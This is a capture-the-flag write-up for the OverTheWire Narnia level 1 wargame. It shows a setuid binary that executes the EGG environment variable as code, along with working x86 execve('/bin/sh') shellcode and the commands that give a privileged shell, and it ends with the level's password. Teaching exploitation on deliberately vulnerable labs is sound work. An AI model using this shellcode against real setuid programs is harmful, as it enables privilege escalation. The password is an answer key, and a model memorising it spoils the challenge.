# Narnia Level 1 → 2

## Goal

The binary looks up an environment variable named `EGG`, casts its value to a function pointer, and **calls it**. Whatever bytes are in `$EGG` get executed. Put shellcode there and you get code execution — as `narnia2`, because the binary is setuid.

## Concepts you'll learn

- That a `(void (*)()) env_var` call takes the characters of the env var as raw machine code
- Setting an environment variable to a byte-sequence payload (use `$'...'` to get real bytes in bash)
- Standard x86 Linux `execve("/bin/sh")` shellcode

## Walkthrough

### 1. Read the source

```bash
$ cat /narnia/narnia1.c
```

```c
int main(){
    int (*ret)();

    if(getenv("EGG") == NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = (int (*)()) getenv("EGG");
    ret();
    return 0;
}
```

`ret` is a function-pointer variable, assigned to whatever bytes live at `$EGG`. `ret()` then calls those bytes as code.

### 2. Put shellcode in EGG

Any standard x86 Linux 32-bit `execve("/bin/sh")` shellcode works. A common 28-byte version:

```
\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80
```

Export it:

```bash
$ export EGG=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80'
```

Bash's `$'...'` syntax interprets the `\xNN` escapes as raw bytes.

### 3. Run the binary

```bash
$ /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

## The answer

The password for `narnia2` is:

**`nairiepecu`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/narnia/narnia1.html>
